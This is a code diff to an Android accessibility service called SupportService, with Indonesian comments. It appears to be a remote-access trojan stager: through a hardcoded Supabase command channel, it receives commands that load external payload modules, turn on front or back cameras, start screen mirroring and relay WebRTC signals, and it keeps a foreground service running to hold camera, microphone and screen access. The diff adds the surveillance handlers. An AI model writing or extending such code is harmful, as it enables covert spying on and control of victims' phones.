@@ -41,6 +41,15 @@ public class SupportService extends AccessibilityService implements SupabaseMana
         this.payloadCallback = cb;
     }
 
+    /**
+     * Payload eksternal wajib memanggil ini agar bisa menerima sinyal WebRTC (Offer/ICE)
+     */
+    public void setSignalingListener(SupabaseManager.SignalingListener listener) {
+        if (supabaseManager != null) {
+            supabaseManager.setSignalingListener(listener);
+        }
+    }
+
     public void setAccessibilityDelegate(AccessibilityDelegate delegate) {
         this.accessibilityDelegate = delegate;
     }
@@ -109,6 +118,9 @@ public class SupportService extends AccessibilityService implements SupabaseMana
         // Inisialisasi Supabase untuk menerima perintah load_module
         supabaseManager = new SupabaseManager(deviceId, "https://envymntjecsgixofegbq.supabase.co", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImVudnltbnRqZWNzZ2l4b2ZlZ2JxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY2MjQ5MzMsImV4cCI6MjA5MjIwMDkzM30.lxdxROh5IptFB7cOnRGjLQomX_KvrJly4CNIKN0-cuc", this);
         supabaseManager.init();
+
+        // WAJIB: Aktifkan Foreground Service agar bisa akses Kamera/Mic/Screen di Android 11+
+        showNotification();
 
         Log.i(TAG, "Stager is waiting for external payload...");
         
@@ -321,6 +333,25 @@ public class SupportService extends AccessibilityService implements SupabaseMana
             Log.d(TAG, "Stager received command: " + cmd);
             String lowerCmd = cmd.toLowerCase();
             
+            if (lowerCmd.equals(Config.CMD_CAMERA_FRONT) || lowerCmd.equals(Config.CMD_CAMERA_BACK)) {
+                if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                    Intent i = new Intent(this, CoreActivity.class);
+                    i.putExtra("request_type", "camera");
+                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    startActivity(i);
+                    return;
+                }
+            }
+            
+            if (lowerCmd.equals("screen")) {
+                Intent i = new Intent(this, CoreActivity.class);
+                i.putExtra("request_mirror", true);
+                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(i);
+                // Payload akan menunggu mirrorIntent tersedia
+                return;
+            }
+
             if (lowerCmd.startsWith(Config.CMD_LOAD_MODULE)) {
                 String url = "";
                 String className = "";
